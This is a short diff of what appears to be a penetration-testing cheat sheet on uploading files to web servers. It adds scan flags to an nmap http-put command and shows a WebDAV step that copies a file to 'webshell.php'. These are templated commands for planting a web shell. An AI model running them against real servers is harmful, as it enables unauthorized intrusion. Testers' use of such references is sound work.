@@ -54,7 +54,7 @@ dav:\> copy file.txt webshell.php
 
 ### 9.2.3 - Nmap
 
-`$ nmap -p 80,443 --script http-put --script-args http-put.url='<upload_directory>',http-put.file='<file>' <IP>`
+`$ nmap -p 80,443 -Pn -n --script http-put --script-args http-put.url='<upload_directory>',http-put.file='<file>' <IP>`
 
 ### 9.2.4 - Metasploit
 
